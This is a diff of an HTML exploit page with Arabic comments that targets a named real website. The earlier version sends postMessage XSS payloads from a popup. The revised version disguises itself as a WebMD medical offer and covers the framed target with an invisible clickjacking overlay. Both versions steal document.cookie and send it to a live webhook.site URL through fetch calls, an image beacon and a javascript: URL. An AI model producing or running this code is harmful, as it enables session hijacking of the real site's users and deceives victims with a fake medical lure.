@@ -1,120 +1,87 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC - PostMessage Exploit</title>
+    <title>عرض طبي خاص - WebMD</title>
+    <style>
+        body { margin: 0; font-family: Arial; }
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.001); /* شفاف تقريباً */
+            z-index: 9999;
+        }
+    </style>
 </head>
 <body>
-    <h3>PostMessage XSS Exploit</h3>
-    <button onclick="exploit()">▶️ Exploit</button>
-    <div id="log" style="font-family:monospace; margin-top:20px;"></div>
+    <!-- 🎯 الـ iframe المستهدف -->
+    <iframe src="https://www.powerpak.com/" 
+            style="width:100%; height:100vh; border:0;" 
+            id="targetFrame"
+            sandbox="allow-scripts allow-same-origin allow-popups">
+    </iframe>
+    
+    <!-- 🎭 overlay للـ Clickjacking -->
+    <div id="overlay" onclick="startExploit()"></div>
 
     <script>
-        const WEBHOOK = 'https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f'; // استبدل هذا
+        const WEBHOOK = 'https://webhook.site/3006785b-1283-4338-8475-208841413c5b';
         const TARGET = 'https://www.powerpak.com/';
-        let stolenData = [];
-
-        function log(msg) {
-            console.log(msg);
-            document.getElementById('log').innerHTML += '> ' + msg + '<br>';
-        }
-
-        function exploit() {
-            log('🚀 Opening target...');
+        
+        function startExploit() {
+            console.log('🚀 Starting exploit...');
             
-            const win = window.open(TARGET, 'target', 'width=1000,height=800');
+            const frame = document.getElementById('targetFrame');
             
-            if (!win) {
-                log('❌ Popup blocked!');
-                return;
-            }
-
-            // 🎯 الاستماع للـ PostMessage من الـ target
-            window.addEventListener('message', (e) => {
-                log('📨 Received message from: ' + e.origin);
+            // 🎪 محاولة 1: PostMessage للـ frames الداخلية
+            try {
+                const win = frame.contentWindow;
                 
-                if (e.data.type === 'STOLEN_COOKIES') {
-                    log('🍪 COOKIES RECEIVED!');
-                    log('Data: ' + JSON.stringify(e.data).substring(0, 100));
-                    
-                    // إرسال للـ Webhook
-                    fetch(WEBHOOK, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify(e.data)
-                    });
+                for (let i = 0; i < win.frames.length; i++) {
+                    try {
+                        const f = win.frames[i];
+                        
+                        if (f.location.href === 'about:blank') {
+                            console.log('🚨 Frame #' + i + ' is about:blank!');
+                            
+                            // 🚨 Alert - إثبات XSS
+                            f.alert('XSS CONFIRMED! Frame #' + i);
+                            
+                            // 🚨 سرقة Cookies
+                            const cookies = f.parent.document.cookie;
+                            console.log('🍪 Stolen:', cookies);
+                            
+                            // 📤 إرسال للـ Webhook
+                            fetch(WEBHOOK + '?frame=' + i + '&cookies=' + encodeURIComponent(cookies));
+                            new Image().src = WEBHOOK + '?c=' + encodeURIComponent(cookies) + '&t=' + Date.now();
+                        }
+                    } catch (e) {
+                        console.log('❌ Frame #' + i + ':', e.message);
+                    }
                 }
-            });
-
-            // 🎯 إرسال payloads للـ target بعد التحميل
-            setTimeout(() => {
-                sendPayloads(win);
-            }, 5000);
-        }
-
-        function sendPayloads(targetWindow) {
-            log('📤 Sending malicious payloads...');
-            
-            // محاولة استغلال PostMessage handlers في الـ target
-            const payloads = [
-                {
-                    type: 'render',
-                    url: 'javascript:alert("XSS1")',
-                    callback: 'parent.postMessage({type:"STOLEN_COOKIES",cookies:document.cookie}, "*")'
-                },
-                {
-                    type: 'loadUrl',
-                    url: 'javascript:alert("XSS2")'
-                },
-                {
-                    type: 'setContent',
-                    html: '<img src=x onerror="alert(\'XSS3\'); parent.postMessage({type:\'STOLEN_COOKIES\',cookies:document.cookie},\'*\')">'
-                },
-                {
-                    type: 'auth',
-                    redirect: 'javascript:alert("XSS4")',
-                    callback: 'steal'
-                },
-                {
-                    type: 'oauth_callback',
-                    token: 'test',
-                    redirect: 'javascript:alert("XSS5")'
-                }
-            ];
-
-            // إرسال لجميع الـ frames
-            for (let i = 0; i < 10; i++) {
-                payloads.forEach((payload, idx) => {
-                    setTimeout(() => {
-                        try {
-                            targetWindow.postMessage(payload, '*');
-                            if (targetWindow.frames[i]) {
-                                targetWindow.frames[i].postMessage(payload, '*');
-                            }
-                        } catch(e) {}
-                    }, idx * 200);
-                });
+            } catch (e) {
+                console.log('💥 Cannot access iframe:', e.message);
             }
-
-            log('✅ Payloads sent! Waiting for response...');
             
-            // 🎪 محاولة أخرى: حقن سكربت مباشرة إذا كان هناك طريقة
-            tryDirectInjection(targetWindow);
+            // 🎪 محاولة 2: PostMessage للموقع المستهدف
+            frame.contentWindow.postMessage({
+                type: 'render',
+                url: 'javascript:alert("XSS_test")'
+            }, '*');
+            
+            // إخفاء الـ overlay
+            document.getElementById('overlay').style.display = 'none';
         }
 
-        function tryDirectInjection(win) {
-            log('🔧 Trying direct injection...');
-            
-            // محاولة استغلال أي ثغرة XSS موجودة
+        // 🎪 محاولة 3: فتح نافذة من الـ iframe نفسه
+        setTimeout(() => {
             try {
-                // التحقق من وجود أي مدخل للـ XSS
-                win.location.hash = 'javascript:alert("XSS_via_hash")';
+                const frame = document.getElementById('targetFrame');
+                frame.contentWindow.open('javascript:fetch("' + WEBHOOK + '?c="+document.cookie)', '_blank');
             } catch(e) {}
-            
-            // محاولة عبر name property
-            try {
-                win.name = 'javascript:alert("XSS_via_name")';
-            } catch(e) {}
-        }
+        }, 3000);
     </script>
 </body>
 </html>
